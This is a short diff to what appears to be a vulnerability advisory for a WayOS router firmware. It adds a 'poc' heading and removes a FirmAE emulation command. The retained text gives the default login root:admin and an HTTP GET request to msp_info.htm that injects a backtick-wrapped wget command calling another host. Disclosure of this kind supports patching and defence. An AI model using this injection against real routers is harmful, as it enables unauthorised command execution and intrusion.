@@ -37,15 +37,10 @@ affect version:
 
 
 
-Firmware emulation：
-
-```
-FirmAE$ sudo ./run.sh -d wayos ~/gujian/FBM_291W-19.09.11V.trx
-```
-
 exploit: 
 
 After logging in with the default password root:admin, accessing the msp_info.htm page, and crafting carefully constructed parameters, it is possible to execute commands.
+poc
 
 ```
 GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/aaa` HTTP/1.1
